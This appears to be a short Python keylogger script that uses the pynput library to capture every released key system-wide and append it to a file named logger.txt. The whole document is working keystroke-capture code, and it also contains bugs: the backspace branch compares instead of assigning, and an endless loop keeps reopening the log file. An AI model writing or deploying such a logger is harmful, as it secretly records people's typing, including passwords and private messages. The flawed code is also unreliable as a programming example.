from pynput import keyboard


def on_release(key):
    print(key)
    
    if key == keyboard.Key.space:
        key = " "
    elif key == keyboard.Key.enter:
        key = "\n"
    elif key == keyboard.Key.backspace:
        key == "[BACKSPACE]"
    f.write(str(key).replace("'", ""))


listener = keyboard .Listener(on_release=on_release)
listener.start()

while True:
    i = 0
    f  = open("logger.txt", "a")